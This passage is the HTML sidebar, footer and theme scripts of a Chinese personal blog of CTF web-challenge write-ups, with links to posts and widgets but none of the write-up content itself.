href="/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/" target="_blank">红明谷CTF-2021-write_shell</a><br></span><span>  7.<a class="is-size-6" href="/2021/08/28/MRCTF2020-Ezaudit/" target="_blank">MRCTF2020-Ezaudit</a><br></span><span>  8.<a class="is-size-6" href="/2021/08/27/GYCTF2020-Easyphp/" target="_blank">GYCTF2020-Easyphp</a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 推荐文章</span><br><span>  1.<a class="is-size-6" href="/2021/09/07/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/" target="_blank">Black-Watch-入群题-Web</a><br></span><span>  2.<a class="is-size-6" href="/2021/08/27/GYCTF2020-Easyphp/" target="_blank">GYCTF2020-Easyphp</a><br></span><span>  3.<a class="is-size-6" href="/2021/08/25/GYCTF2020-EasyThinking/" target="_blank">GYCTF2020-EasyThinking</a><br></span><span>  4.<a class="is-size-6" href="/2021/08/22/HFCTF2020-JustEscape/" target="_blank">HFCTF2020-JustEscape</a><br></span><span>  5.<a class="is-size-6" href="/2021/09/03/ISITDTU-2019-EasyPHP/" target="_blank">ISITDTU-2019-EasyPHP</a><br></span><span>  6.<a class="is-size-6" href="/2021/08/28/MRCTF2020-Ezaudit/" target="_blank">MRCTF2020-Ezaudit</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/inanb.png" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/inanb.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/09/09/N1CTF-2018-eating_cms/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">N1CTF-2018-eating_cms</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/09/07/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/"><span class="level-item">Black-Watch-入群题-Web</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/header.jpg" alt="inanb"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">inanb</p><p class="is-size-6 is-block">铁马冰河入梦来</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">111</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/inanb" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/inanb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
+                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
+                                if(data){
+                                    $('#hitokoto').html("");
+                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
+                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
+                                }});}
+                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-09T15:00:25.299Z">2021-09-09</time></p><p class="title"><a href="/2021/09/09/N1CTF-2018-eating_cms/">N1CTF-2018-eating_cms</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-08T05:51:10.185Z">2021-09-08</time></p><p class="title"><a href="/2021/09/08/%E5%AE%9E%E9%AA%8C--Mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/">实验--Mysql服务端反向读取客户端的任意文件</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-07T01:10:36.980Z">2021-09-07</time></p><p class="title"><a href="/2021/09/07/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/">Black-Watch-入群题-Web</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T09:42:32.238Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/b01lers2020-Life_on_Mars/">b01lers2020-Life_on_Mars</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T03:15:58.421Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/ISITDTU-2019-EasyPHP/">ISITDTU-2019-EasyPHP</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/LeetCode/"><span class="level-start"><span class="level-item">LeetCode</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">19</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"><span class="level-start"><span class="level-item">学习报告</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/buuctf/"><span class="tag">buuctf</span><span class="tag is-grey-lightest">19</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf/"><span class="tag">Buuctf</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"><span class="tag">php变量覆盖</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><span class="tag">伪协议</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">Buuctf PHP代码审计 文件包含</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-SQL/"><span class="tag">Buuctf SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Html%E5%92%8Ccss/"><span class="tag">Html和css</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a><p class="size-small"><span>&copy; 2021 inanb</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2165337463" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
+        
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(false){
+                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
+            }
+            if(false){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });</script></body></html>
